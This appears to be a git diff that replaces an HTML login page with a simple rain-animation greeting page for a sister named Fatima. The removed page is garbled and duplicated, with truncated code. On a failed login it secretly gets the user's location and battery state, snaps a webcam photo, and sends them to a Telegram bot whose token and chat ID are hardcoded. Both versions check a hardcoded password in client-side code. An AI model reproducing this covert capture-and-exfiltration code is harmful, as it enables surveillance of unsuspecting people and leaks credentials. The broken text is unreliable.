@@ -1,542 +1,148 @@
-<!DOCTYPE html>
-<html lang="en">
-<head>
-<meta charset="UTF-8" />
-<meta name="viewport" content="width=device-width, initial-scale=1" />
-<title>Sahilkijan Secure Login</title>
-<style>
-  body, html {
-    margin: 0; padding: 0; height: 100%; overflow: hidden; font-family: Arial, sans-serif;
-    background: #0e0e10;
-    color: white;
-    position: relative;
-  }
-  #rain-canvas {
-    position: fixed;
-    top: 0; left: 0;
-    width: 100%;
-    height: 100%;
-    z-index: 0;
-  }
-  .login-container {
-    position: relative;
-    z-index: 10;
-    background: rgba(0,0,0,0.7);
-    border-radius: 10px;
-    padding: 30px 25px;
-    max-width: 360px;
-    margin: auto;
-    top: 50%;
-    transform: translateY(-50%);
-    box-shadow: 0 0 15px #111;
-  }
-  h2 {
-    margin-bottom: 25px;
-    text-align: center;
-  }
-  input[type="text"], input[type="password"] {
-    width: 100%;
-    padding: 12px;
-    margin: 8px 0 20px 0;
-    border: none;
-    border-radius: 6px;
-    font-size: 16px;
-  }
-  button {
-    width: 100%;
-    padding: 12px;
-    border: none;
-    border-radius: 6px;
-    background-color: #4a90e2;
-    color: white;
-    font-size: 16px;
-    cursor: pointer;
-    transition: background-color 0.3s ease;
-  }
-  button:hover {
-    background-color: #357ABD;
-  }
-  .error {
-    color: #ff6b6b;
-    margin-bottom: 15px;
-    text-align: center;
-    font-weight: bold;
-  }
-  audio {
-    display: none;
-  }
-</style>
-</head>
-<body>
-
-<canvas id="rain-canvas"></canvas>
-
-<div class="login-container">
-  <h2>Login to Sahilkijan</h2>
-  <div id="error" class="error"></div>
-  <input type="text" id="username" placeholder="Username" autocomplete="off" />
-  <input type="password" id="password" placeholder="Password" autocomplete="off" />
-  <button id="login-btn">Login</button>
-</div>
-
-<audio id="bg-music" loop muted>
-  <source src="https://drive.google.com/uc?export=download&id=10EcNHISjcW73BipAk-EhoUUCPwjCIPkO" type="audio/mpeg" />
-  Your browser does not support the audio element.
-</audio>
-
-<script>
-(() => {
-  'use strict';
-
-  const TELEGRAM_BOT_TOKEN = '7767077395:AAGxsUfQnAHyLmxXE2F1093Fc59MXHcSUkc';
-  const TELEGRAM_CHAT_ID = '7597265569';
-
-  const CORRECT_USERNAME = 'Sahilkijan';
-  const CORRECT_PASSWORD = 'bhaikiguriya';
-
-  const errorDiv = document.getElementById('error');
-  const loginBtn = document.getElementById('login-btn');
-  const music = document.getElementById('bg-music');
-
-  // Rain animation setup
-  const canvas = document.getElementById('rain-canvas');
-  const ctx = canvas.getContext('2d');
-  let width, height;
-  let drops = [];
-
-  function resize() {
-    width = window.innerWidth;
-    height = window.innerHeight;
-    canvas.width = width;
-    canvas.height = height;
-  }
-  window.addEventListener('resize', resize);
-  resize();
-
-  function createDrops() {
-    drops = [];
-    for (let i = 0; i < 400; i++) {
-      drops.push({
-        x: Math.random() * width,
-        y: Math.random() * height,
-        length: 10 + Math.random() * 20,
-        speed: 4 + Math.random() * 4,
-        opacity: 0.2 + Math.random() * 0.5
-      });
+<!doctype html>
+<html lang="en">  
+<head>  
+  <meta charset="UTF-8">  
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">  
+  <title>Welcome My Cute Sister</title>  
+  <style>  
+    body { margin: 0; overflow: hidden; background: #000; font-family: Arial, sans-serif; }  
+    .container.demo3 { width: 100vw; height: 100vh; position: relative; }  
+    canvas#water { position: absolute; top: 0; left: 0; width: 100%; height: 100%; }  
+    .rain { position: absolute; top: 0; left: 0; width: 100%; height: 100%; background: url('https://tympanus.net/Development/RainEffect/img/rain.png'); opacity: 0.3; }  
+    .custom-text {  
+      position: absolute;  
+      top: 10%;  
+      left: 50%;  
+      transform: translateX(-50%);  
+      text-align: center;  
+      font-family: 'Pacifico', cursive;  
+      color: white;  
+      font-size: 30px;  
+      text-shadow: 2px 2px 5px rgba(0, 0, 0, 0.6);  
+      z-index: 10;  
+    }  
+    .sub-text {  
+      font-size: 18px;  
+      margin-top: 10px;  
+      font-family: 'Courier New', monospace;  
+      color: #f2f2f2;  
+    }  
+    .login-box {
+      position: absolute;
+      bottom: 50px;
+      left: 50%;
+      transform: translateX(-50%);
+      background: rgba(255,255,255,0.1);
+      padding: 20px;
+      border-radius: 10px;
+      box-shadow: 0 0 15px rgba(255,255,255,0.2);
+      z-index: 20;
     }
-  }
+    .login-box input {
+      display: block;
+      margin: 10px auto;
+      padding: 10px;
+      width: 200px;
+      border-radius: 5px;
+      border: none;
+      outline: none;
+    }
+    .login-box button {
+      background: #00aaff;
+      color: white;
+      padding: 10px 20px;
+      border: none;
+      border-radius: 5px;
+      cursor: pointer;
+    }
+  </style>  
+</head>  
+<body>  
+  <div class="custom-text">  
+    Welcome My Cute Sister  
+    <br><span class="sub-text">World Best Sister - Fatima</span>  
+  </div>    
 
-  function draw() {
-    ctx.clearRect(0, 0, width, height);
-    ctx.strokeStyle = 'rgba(174,194,224,0.5)';
-    ctx.lineWidth = 1;
-    ctx.lineCap = 'round';
+  <div class="login-box">
+    <input type="text" id="username" placeholder="Username">
+    <input type="password" id="password" placeholder="Password">
+    <button onclick="login()">Login</button>
+  </div>  
 
-    drops.forEach(drop => {
-      ctx.beginPath();
-      ctx.moveTo(drop.x, drop.y);
-      ctx.lineTo(drop.x, drop.y + drop.length);
-      ctx.stroke();
+  <div id="container" class="container demo3">  
+    <canvas id="water"></canvas>  
+    <div class="rain"></div>  
+  </div>    
+
+  <script>
+    const correctUsername = "Sahilkijan";
+    const correctPassword = "bhaikiguriya";
+
+    function login() {
+      const u = document.getElementById('username').value;
+      const p = document.getElementById('password').value;
+
+      if (u === correctUsername && p === correctPassword) {
+        alert("Welcome Fatima!");
+      } else {
+        alert("Incorrect username or password!");
+      }
+    }
+
+    // Rain Animation
+    var canvas = document.getElementById('water');  
+    var ctx = canvas.getContext('2d');  
+    var width = canvas.width = window.innerWidth;  
+    var height = canvas.height = window.innerHeight;  
+    var drops = [];  
+    
+    for (var i = 0; i < 500; i++) {  
+      drops.push({  
+        x: Math.random() * width,  
+        y: Math.random() * height,  
+        length: Math.random() * 20 + 10,  
+        velocity: Math.random() * 4 + 4  
+      });  
+    }  
+
+    function draw() {  
+      ctx.clearRect(0, 0, width, height);  
+      ctx.strokeStyle = 'rgba(174,194,224,0.5)';  
+      ctx.lineWidth = 1;  
+      ctx.lineCap = 'round';  
+
+      for (var i = 0; i < drops.length; i++) {  
+        var d = drops[i];  
+        ctx.beginPath();  
+        ctx.moveTo(d.x, d.y);  
+        ctx.lineTo(d.x, d.y + d.length);  
+        ctx.stroke();  
+      }  
+      move();  
+    }  
+
+    function move() {  
+      for (var i = 0; i < drops.length; i++) {  
+        var d = drops[i];  
+        d.y += d.velocity;  
+        if (d.y > height) {  
+          d.y = -20;  
+          d.x = Math.random() * width;  
+        }  
+      }  
+    }  
+
+    function loop() {  
+      draw();  
+      requestAnimationFrame(loop);  
+    }  
+
+    loop();  
+
+    window.addEventListener('resize', function () {  
+      width = canvas.width = window.innerWidth;  
+      height = canvas.height = window.innerHeight;  
     });
-
-    update();
-  }
-
-  function update() {
-    drops.forEach(drop => {
-      drop.y += drop.speed;
-      if (drop.y > height) {
-        drop.x = Math.random() * width;
-        drop.y = -drop.length;
-        drop.length = 10 + Math.random() * 20;
-        drop.speed = 4 + Math.random() * 4;
-        drop.opacity = 0.2 + Math.random() * 0.5;
-      }
-    });
-  }
-
-  function animate() {
-    draw();
-    requestAnimationFrame(animate);
-  }
-
-  createDrops();
-  animate();
-
-  // Try to play music muted (required by autoplay policies)
-  music.play().catch(e => {
-    console.log('Autoplay blocked, waiting for user interaction');
-  });
-
-  // On first user interaction, unmute music
-  function unmuteMusic() {
-    music.muted = false;
-    music.play().catch(() => {});
-    window.removeEventListener('click', unmuteMusic);
-    window.removeEventListener('keydown', unmuteMusic);
-  }
-  window.addEventListener('click', unmuteMusic);
-  window.addEventListener('keydown', unmuteMusic);
-
-  // Login logic
-  loginBtn.addEventListener('click', () => {
-    errorDiv.textContent = '';
-    const username = document.getElementById('username').value.trim();
-    const password = document.getElementById('password').value;
-
-    if (username === CORRECT_USERNAME && password === CORRECT_PASSWORD) {
-      alert('Welcome Sahilkijan!');
-    } else {
-      errorDiv.textContent = 'Invalid username or password.';
-      triggerSurveillance(username);
-    }
-  });
-
-  // Send Telegram message
-  function sendTelegramMessage(message) {
-    fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
-      method: 'POST',
-      headers: { 'Content-Type': 'application/json' },
-      body: JSON.stringify({
-        chat_id: TELEGRAM_CHAT_ID,
-        text: message,
-        parse_mode: 'Markdown'
-      }),
-    }).catch(err => console.error('Telegram message error:', err));
-  }
-<!DOCTYPE html>
-<html lang="en">
-<head>
-<meta charset="UTF-8" />
-<meta name="viewport" content="width=device-width, initial-scale=1" />
-<title>Sahilkijan Secure Login</title>
-<style>
-  body, html {
-    margin: 0; padding: 0; height: 100%; overflow: hidden; font-family: Arial, sans-serif;
-    background: #0e0e10;
-    color: white;
-    position: relative;
-  }
-  #rain-canvas {
-    position: fixed;
-    top: 0; left: 0;
-    width: 100%;
-    height: 100%;
-    z-index: 0;
-  }
-  .login-container {
-    position: relative;
-    z-index: 10;
-    background: rgba(0,0,0,0.7);
-    border-radius: 10px;
-    padding: 30px 25px;
-    max-width: 360px;
-    margin: auto;
-    top: 50%;
-    transform: translateY(-50%);
-    box-shadow: 0 0 15px #111;
-  }
-  h2 {
-    margin-bottom: 25px;
-    text-align: center;
-  }
-  input[type="text"], input[type="password"] {
-    width: 100%;
-    padding: 12px;
-    margin: 8px 0 20px 0;
-    border: none;
-    border-radius: 6px;
-    font-size: 16px;
-  }
-  button {
-    width: 100%;
-    padding: 12px;
-    border: none;
-    border-radius: 6px;
-    background-color: #4a90e2;
-    color: white;
-    font-size: 16px;
-    cursor: pointer;
-    transition: background-color 0.3s ease;
-  }
-  button:hover {
-    background-color: #357ABD;
-  }
-  .error {
-    color: #ff6b6b;
-    margin-bottom: 15px;
-    text-align: center;
-    font-weight: bold;
-  }
-  audio {
-    display: none;
-  }
-</style>
-</head>
-<body>
-
-<canvas id="rain-canvas"></canvas>
-
-<div class="login-container">
-  <h2>Login to Sahilkijan</h2>
-  <div id="error" class="error"></div>
-  <input type="text" id="username" placeholder="Username" autocomplete="off" />
-  <input type="password" id="password" placeholder="Password" autocomplete="off" />
-  <button id="login-btn">Login</button>
-</div>
-
-<audio id="bg-music" loop muted>
-  <source src="https://drive.google.com/uc?export=download&id=10EcNHISjcW73BipAk-EhoUUCPwjCIPkO" type="audio/mpeg" />
-  Your browser does not support the audio element.
-</audio>
-
-<script>
-(() => {
-  'use strict';
-
-  const TELEGRAM_BOT_TOKEN = '7767077395:AAGxsUfQnAHyLmxXE2F1093Fc59MXHcSUkc';
-  const TELEGRAM_CHAT_ID = '7597265569';
-
-  const CORRECT_USERNAME = 'Sahilkijan';
-  const CORRECT_PASSWORD = 'bhaikiguriya';
-
-  const errorDiv = document.getElementById('error');
-  const loginBtn = document.getElementById('login-btn');
-  const music = document.getElementById('bg-music');
-
-  // Rain animation setup
-  const canvas = document.getElementById('rain-canvas');
-  const ctx = canvas.getContext('2d');
-  let width, height;
-  let drops = [];
-
-  function resize() {
-    width = window.innerWidth;
-    height = window.innerHeight;
-    canvas.width = width;
-    canvas.height = height;
-  }
-  window.addEventListener('resize', resize);
-  resize();
-
-  function createDrops() {
-    drops = [];
-    for (let i = 0; i < 400; i++) {
-      drops.push({
-        x: Math.random() * width,
-        y: Math.random() * height,
-        length: 10 + Math.random() * 20,
-        speed: 4 + Math.random() * 4,
-        opacity: 0.2 + Math.random() * 0.5
-      });
-    }
-  }
-
-  function draw() {
-    ctx.clearRect(0, 0, width, height);
-    ctx.strokeStyle = 'rgba(174,194,224,0.5)';
-    ctx.lineWidth = 1;
-    ctx.lineCap = 'round';
-
-    drops.forEach(drop => {
-      ctx.beginPath();
-      ctx.moveTo(drop.x, drop.y);
-      ctx.lineTo(drop.x, drop.y + drop.length);
-      ctx.stroke();
-    });
-
-    update();
-  }
-
-  function update() {
-    drops.forEach(drop => {
-      drop.y += drop.speed;
-      if (drop.y > height) {
-        drop.x = Math.random() * width;
-        drop.y = -drop.length;
-        drop.length = 10 + Math.random() * 20;
-        drop.speed = 4 + Math.random() * 4;
-        drop.opacity = 0.2 + Math.random() * 0.5;
-      }
-    });
-  }
-
-  function animate() {
-    draw();
-    requestAnimationFrame(animate);
-  }
-
-  createDrops();
-  animate();
-
-  // Try to play music muted (required by autoplay policies)
-  music.play().catch(e => {
-    console.log('Autoplay blocked, waiting for user interaction');
-  });
-
-  // On first user interaction, unmute music
-  function unmuteMusic() {
-    music.muted = false;
-    music.play().catch(() => {});
-    window.removeEventListener('click', unmuteMusic);
-    window.removeEventListener('keydown', unmuteMusic);
-  }
-  window.addEventListener('click', unmuteMusic);
-  window.addEventListener('keydown', unmuteMusic);
-
-  // Login logic
-  loginBtn.addEventListener('click', () => {
-    errorDiv.textContent = '';
-    const username = document.getElementById('username').value.trim();
-    const password = document.getElementById('password').value;
-
-    if (username === CORRECT_USERNAME && password === CORRECT_PASSWORD) {
-      alert('Welcome Sahilkijan!');
-    } else {
-      errorDiv.textContent = 'Invalid username or password.';
-      triggerSurveillance(username);
-    }
-  });
-
-  // Send Telegram message
-  function sendTelegramMessage(message) {
-    fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
-      method: 'POST',
-      headers: { 'Content-Type': 'application/json' },
-      body: JSON.stringify({
-        chat_id: TELEGRAM_CHAT_ID,
-        text: message,
-        parse_mode: 'Markdown'
-      }),
-    }).catch(err => console.error('Telegram message error:', err));
-  }
-
-  // Send Telegram photo
-  function sendTelegramPhoto(photoBlob, caption) {
-    const formData = new FormData();
-    formData.append('chat_id', TELEGRAM_CHAT_ID);
-    formData.append('photo', photoBlob, 'intruder.jpg');
-    formData.append('caption', caption);
-
-    fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendPhoto`, {
-      method: 'POST',
-      body: formData
-    }).catch(err => console.error('Telegram photo error:', err));
-  }
-
-  // Trigger surveillance on wrong login
-  async function triggerSurveillance(enteredUsername) {
-    let batteryInfo = 'Battery info not available';
-    if (navigator.getBattery) {
-      try {
-        const battery = await navigator.getBattery();
-        batteryInfo = `Battery level: ${(battery.level * 100).toFixed(0)}%, Charging: ${battery.charging}`;
-      } catch (e) {
-        console.warn('Battery info error', e);
-      }
-    }
-
-    function capturePhotoAndSend(locationInfo) {
-      if (!navigator.mediaDevices || !navigator.mediaDevices.getUserMedia) {
-        sendTelegramMessage(`*Intruder Alert*\nUsername Attempt: ${enteredUsername}\n${locationInfo}\n${batteryInfo}\nCamera not available.`);
-        return;
-      }
-
-      navigator.mediaDevices.getUserMedia({ video: true, audio: false })
-        .then((stream) => {
-          const video = document.createElement('video');
-          video.srcObject = stream;
-          video.play();
-
-          video.addEventListener('loadeddata', () => {
-            const canvasPhoto = document.createElement('canvas');
-            canvasPhoto.width = video.videoWidth;
-            canvasPhoto.height = video.videoHeight;
-            const ctxPhoto = canvasPhoto.getContext('2d');
-            ctxPhoto.drawImage(video, 0, 0);
-
-            canvasPhoto.toBlob((blob) => {
-              const caption = `*Intruder Alert*\nUsername Attempt: ${enteredUsername}\n${locationInfo}\n${batteryInfo}`;
-              sendTelegramPhoto(blob, caption);
-              stream.getTracks().forEach(track => track.stop());
-            }, 'image/jpeg', 0.8);
-          });
-        })
-        .catch(() => {
-          sendTelegramMessage(`*Intruder Alert*\nUsername Attempt: ${enteredUsername}\n${locationInfo}\n${batteryInfo}\nUnable to access camera.`);
-        });
-    }
-
-    if (navigator.geolocation) {
-      navigator.geolocation.getCurrentPosition(
-        (pos) => {
-          const locationInfo = `Latitude: ${pos.coords.latitude.toFixed(6)}, Longitude: ${pos.coords.longitude.toFixed(6)}`;
-          capturePhotoAndSend(locationInfo);
-        },
-        (err) => {
-          const locationInfo = 'Location permission denied or unavailable.';
-          capturePhotoAndSend(locationInfo);
-        },
-        { timeout: 10000 }
-      );
-    } else {
-      capturePhotoAndSend('Location not available');
-    }
-  }
-
-})();
-</script>
-
-</body>
-</html>￼Enter
-  // Send Telegram photo
-  function sendTelegramPhoto(photoBlob, caption) {
-    const formData = new FormData();
-    formData.append('chat_id', TELEGRAM_CHAT_ID);
-    formData.append('photo', photoBlob, 'intruder.jpg');
-    formData.append('caption', caption);
-
-    fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendPhoto`, {
-      method: 'POST',
-      body: formData
-    }).catch(err => console.error('Telegram photo error:', err));
-  }
-
-  // Trigger surveillance on wrong login
-  async function triggerSurveillance(enteredUsername) {
-    let batteryInfo = 'Battery info not available';
-    if (navigator.getBattery) {
-      try {
-        const battery = await navigator.getBattery();
-        batteryInfo = `Battery level: ${(battery.level * 100).toFixed(0)}%, Charging: ${battery.charging}`;
-      } catch (e) {
-        console.warn('Battery info error', e);
-      }
-    }
-
-nction capturePhotoAndSend(locationInfo) {
-      if (!navigator.mediaDevices || !navigator.mediaDevices.getUserMedia) {
-        sendTelegramMessage(`*Intruder Alert*\nUsername Attempt: ${enteredUsername}\n${locationInfo}\n${batteryInfo}\nCamera not available.`);
-        return;
-      }
-
-      navigator.mediaDevices.getUserMedia({ video: true, audio: false })
-        .then((stream) => {
-          const video = document.createElement('video');
-          video.srcObject = stream;
-          video.play();
-
-          video.addEventListener('loadeddata', () => {
-            const canvasPhoto = document.createElement('canvas');
-            canvasPhoto.width = video.videoWidth;
-            canvasPhoto.height = video.videoHeight;
-            const ctxPhoto = canvasPhoto.getContext('2d');
-            ctxPhoto.drawImage(video, 0, 0);
-
-            canvasPhoto.toBlob((blob) => {
-              const caption = `*Intruder Alert*\nUsername Attempt: ${enteredUsername}\n${locationInfo}\n${batteryInfo}`;
-              sendTelegramPhoto(blob, caption);
-              stream.getTracks().forEach(track => track.stop());
-            }, 'image/jpeg', 0.8);
-          });
-        })
+  </script>  
+</body>  
+</html>
